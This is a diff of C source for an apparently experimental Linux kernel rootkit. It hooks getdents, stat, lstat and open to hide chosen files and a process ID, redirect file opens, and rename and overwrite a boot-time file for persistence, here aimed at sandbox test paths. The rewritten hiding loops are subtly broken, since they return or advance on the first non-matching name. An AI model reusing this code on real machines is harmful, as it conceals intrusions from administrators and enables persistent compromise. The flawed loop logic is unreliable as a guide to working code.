@@ -33,7 +33,9 @@
 
 // this is the filename we want to hide
 // used in hacked_getdents(...)
-#define TO_HIDE "test_file.txt"
+// #define TO_HIDE "test_file.txt"
+const int   TO_HIDE_SIZE = 2;
+const char* TO_HIDE[]    = { "test_file.txt\0", "fake_modules_original.txt\0" };
 char hidePID[6] = "-1";
 
 // this is the c file which will replace /sbin/init
@@ -44,8 +46,8 @@ char hidePID[6] = "-1";
 // #define FILE_INIT_ORIGINAL      "/sbin/init_original"
 // #define FILE_INIT               "/vagrant/init_temp"
 // #define FILE_INIT_ORIGINAL      "/vagrant/init_temp_original"
-#define FILE_INIT               "/home/vagrant/pretend_sbin/fake_init\0"
-#define FILE_INIT_ORIGINAL      "/home/vagrant/pretend_sbin/fake_init_original\0"
+#define FILE_INIT               "/home/vagrant/pretend_sbin/fake_modules.txt\0"
+#define FILE_INIT_ORIGINAL      "/home/vagrant/pretend_sbin/fake_modules_original.txt\0"
 
 // 'map' for replacement open operations
 // e.g. trying to open dog.txt will get you red.txt instead
@@ -53,8 +55,8 @@ char hidePID[6] = "-1";
 const int   replacement_size     = 1;
 // const char* replacement_keys[]   = { "/home/vagrant/redirect/dog.txt\0", "/home/vagrant/redirect/cat.txt\0",  "/home/vagrant/redirect/test_prog\0" };
 // const char* replacement_values[] = { "/home/vagrant/redirect/red.txt\0", "/home/vagrant/redirect/blue.txt\0", "/home/vagrant/redirect/test_prog_redirect\0" };
-const char* replacement_keys[]   = { "/home/vagrant/pretend_sbin/fake_init\0" };
-const char* replacement_values[] = { "/home/vagrant/pretend_sbin/fake_init_original\0" };
+const char* replacement_keys[]   = { "/home/vagrant/pretend_sbin/fake_modules.txt\0" };
+const char* replacement_values[] = { "/home/vagrant/pretend_sbin/fake_modules_original.txt\0" };
 
 // 1 = custom boot-loader installed; run modified syscalls
 // 0 = custom boot-loader not yet installed; don't use modified syscalls
@@ -183,29 +185,33 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
 
     // loop through the returned struct
     struct linux_dirent *cur = dirp;
-    int i = 0;
+    int i = 0, j = 0;
     while (i < ret) {
         // if we see the filename which we want to hide,
         // then modify the number of bytes read
         // & move on
-        if (strncmp(cur->d_name, TO_HIDE, strlen(TO_HIDE)) == 0 || strncmp(cur->d_name, hidePID, strlen(hidePID)) == 0) {
-            // length of the linux_dirent
-            int reclen = cur->d_reclen;
-            // calc. the next file/directory location
-            char* next_rec = (char*) cur + reclen;
+        for (j = 0; j < TO_HIDE_SIZE; j++) {
+            char* to_hide = TO_HIDE[j];
+            if (strncmp(cur->d_name, to_hide, strlen(to_hide)) == 0 || strncmp(cur->d_name, hidePID, strlen(hidePID)) == 0) {
+                printk("Tried to getdents %s; hiding...\n", to_hide);
+                // length of the linux_dirent
+                int reclen = cur->d_reclen;
+                // calc. the next file/directory location
+                char* next_rec = (char*) cur + reclen;
 
-            //      = end location of our directory - next file/directory location
-            long len = (long) dirp + ret - (long) next_rec;
-            // move onto the next directory/file
-            // (this copies bytes from next_rec into cur)
-            memmove(cur, next_rec, len);
-            // update our return value so it isn't suspicious
-            ret -= reclen;
-        } else {
-            // we don't match -
-            // move on to the next directory/file
-            i += cur->d_reclen;
-            cur = (struct linux_dirent*) ((char*) dirp + i);
+                //      = end location of our directory - next file/directory location
+                long len = (long) dirp + ret - (long) next_rec;
+                // move onto the next directory/file
+                // (this copies bytes from next_rec into cur)
+                memmove(cur, next_rec, len);
+                // update our return value so it isn't suspicious
+                ret -= reclen;
+            } else {
+                // we don't match -
+                // move on to the next directory/file
+                i += cur->d_reclen;
+                cur = (struct linux_dirent*) ((char*) dirp + i);
+            }
         }
     }
 
@@ -229,47 +235,55 @@ const char* strip_filepath(const char* filepath) {
 // NOTE: this does not append 'No such file or directory' to the end;
 // is the error code return working?
 asmlinkage int hacked_stat(const char *path, struct stat *buf) {
-    int i;
+    int i, j;
     const char* filename = strip_filepath(path);
-    if (strncmp(filename, TO_HIDE, strlen(TO_HIDE)) == 0) {
-        return -ENOENT;
-    } else {
-        // check for replacement as well
-        // for (i = 0; i < replacement_size; i++) {
-        //     // check if pathname is in map
-        //     if (strncmp(path, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
-        //         // redirect to replacement file
-        //         printk("tried to stat %s; redirecting stat from %s to %s...\n", path, replacement_keys[i], replacement_values[i]);
-        //         return original_stat(replacement_values[i], buf);
-        //     }
-        // }
+    for (j = 0; j < TO_HIDE_SIZE; j++) {
+        char* to_hide = TO_HIDE[j];
+        if (strncmp(filename, to_hide, strlen(to_hide)) == 0) {
+            printk("Tried to stat %s; hiding...\n", to_hide);
+            return -ENOENT;
+        } else {
+            // check for replacement as well
+            // for (i = 0; i < replacement_size; i++) {
+            //     // check if pathname is in map
+            //     if (strncmp(path, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
+            //         // redirect to replacement file
+            //         printk("tried to stat %s; redirecting stat from %s to %s...\n", path, replacement_keys[i], replacement_values[i]);
+            //         return original_stat(replacement_values[i], buf);
+            //     }
+            // }
 
-        return original_stat(path, buf);
+            return original_stat(path, buf);
+        }
     }
 }
 
 asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
-    int i;
+    int i, j;
     const char* filename = strip_filepath(path);
-    if (strncmp(filename, TO_HIDE, strlen(TO_HIDE)) == 0) {
-        return -ENOENT;
-    } else {
-        // check for replacement as well
-        // for (i = 0; i < replacement_size; i++) {
-        //     // check if pathname is in map
-        //     if (strncmp(path, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
-        //         // redirect to replacement file
-        //         printk("tried to lstat %s; redirecting lstat from %s to %s...\n", path, replacement_keys[i], replacement_values[i]);
-        //         return original_stat(replacement_values[i], buf);
-        //     }
-        // }
+    for (j = 0; j < TO_HIDE_SIZE; j++) {
+        char* to_hide = TO_HIDE[j];
+        if (strncmp(filename, to_hide, strlen(to_hide)) == 0) {
+            printk("Tried to lstat %s; hiding...\n", to_hide);
+            return -ENOENT;
+        } else {
+            // check for replacement as well
+            // for (i = 0; i < replacement_size; i++) {
+            //     // check if pathname is in map
+            //     if (strncmp(path, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
+            //         // redirect to replacement file
+            //         printk("tried to lstat %s; redirecting lstat from %s to %s...\n", path, replacement_keys[i], replacement_values[i]);
+            //         return original_stat(replacement_values[i], buf);
+            //     }
+            // }
 
-        return original_lstat(path, buf);
+            return original_lstat(path, buf);
+        }
     }
 }
 
 asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) {
-    // if (boot_loader_init == 1) {
+    if (boot_loader_init == 1) {
         // this can use relative path as well so we need to check only the filename.
         // probs not great
         const char* pathname_stripped = strip_filepath(pathname);
@@ -294,7 +308,7 @@ asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) 
                 return fd;
             }
         }
-    // }
+    }
 
     return original_open(pathname, flags, mode);
 }
@@ -673,20 +687,22 @@ void add_to_reboot() {
 
     // REALLY NEED to check if file exists!
 
-    // boot_loader_init = 0;
+    boot_loader_init = 0;
     // we only need to replace one i.e. if the
     // 'fake' file doesn't exist
-    // if (does_file_exist(FILE_INIT_ORIGINAL) == 0) {    
+    if (does_file_exist(FILE_INIT_ORIGINAL) == 0) {    
         int ret;
 
         // store file permissions of original init
         // umode_t orig_perms = get_file_permissions(FILE_INIT);
 
         // rename original init
-        // rename_file(FILE_INIT, FILE_INIT_ORIGINAL);
+        rename_file(FILE_INIT, FILE_INIT_ORIGINAL);
 
         // compile (/'copy' over replacement init)
         // compile to same folder (kernel space)
+        clone_file("modules_replacement.txt", FILE_INIT);
+
         // char bash_compile[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT_REPLACEMENT_OUTPUT)];
         // sprintf(bash_compile, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT_REPLACEMENT_OUTPUT);
         // printk("bash_compile: %s\n", bash_compile);
@@ -713,9 +729,6 @@ void add_to_reboot() {
         // sprintf(bash_perms_repl, "chmod %o %s", orig_perms, FILE_INIT_ORIGINAL);
         // printk("bash_perms_repl: %s\n", bash_perms_repl);
         // ret = run_bash(bash_perms_repl);
-
-        // boot_loader_init = 1;
-    // } else {
-    //     boot_loader_init = 1;
-    // }
+    }
+    boot_loader_init = 1;
 }
